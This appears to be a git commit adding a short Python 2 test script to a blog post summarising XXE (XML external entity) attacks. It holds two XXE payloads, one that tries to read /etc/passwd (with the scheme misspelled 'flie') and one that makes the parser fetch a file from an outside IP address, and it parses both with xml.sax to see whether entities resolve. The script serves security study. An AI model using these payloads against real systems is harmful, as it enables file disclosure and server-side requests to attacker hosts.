7ba7621efaccb37e0df2a10f9169256a19ce032b
Virusday <760160677@qq.com>
2020-11-22 19:31:48 +0800

    Site updated: 2020-11-22 19:31:37

---
+++ 2020/11/18/XXE总结/XXE总结/1.py
@@ -0,0 +1,43 @@
+## coding=utf8
+import xml.sax
+
+x1 = """<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE v1sec[
+    <!ELEMENT methodname ANY>
+    <!ENTITY xxe SYSTEM "flie:///etc/passwd">
+]>
+<methodcall>
+<methodname>&xxe;</methodname>
+</methodcall>
+
+"""
+
+x2 = """<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE v1sec[
+    <!ELEMENT methodname ANY>
+    <!ENTITY xxe SYSTEM "http://121.196.99.128:14433/xml.test">
+
+]>
+<methodcall>
+    <methodname>&xxe;</methodname>
+</methodcall>
+
+"""
+
+class MyContentHandler(xml.sax.ContentHandler):
+    def __init__(self):
+        xml.sax.ContentHandler.__init__(self)
+    
+    def startElement(self,name,attrs):
+        self.chars = ""
+    
+    def endElement(self,name):
+        print name, self.chars
+
+    def characters(self,content):
+        self.chars += content
+
+
+parser = MyContentHandler()
+print xml.sax.parseString(x1,parser)
+print xml.sax.parseString(x2,parser)
